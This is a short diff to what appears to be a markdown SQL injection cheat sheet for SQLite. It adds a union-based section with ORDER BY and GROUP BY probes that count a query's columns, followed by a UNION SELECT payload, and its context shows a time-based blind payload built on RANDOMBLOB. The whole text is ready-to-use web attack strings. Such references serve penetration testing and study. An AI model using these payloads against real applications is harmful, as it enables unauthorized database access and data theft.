@@ -53,4 +53,24 @@ SQLite
 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ```
 
+### **Exploiting Union Based**
+```
+1' ORDER BY 1--+    #True
+1' ORDER BY 2--+    #True
+1' ORDER BY 3--+    #True
+1' ORDER BY 4--+    #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+    True
+
+1' GROUP BY 1--+    #True
+1' GROUP BY 2--+    #True
+1' GROUP BY 3--+    #True
+1' GROUP BY 4--+    #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+    True
+```
+
+
+
+
+
+
 
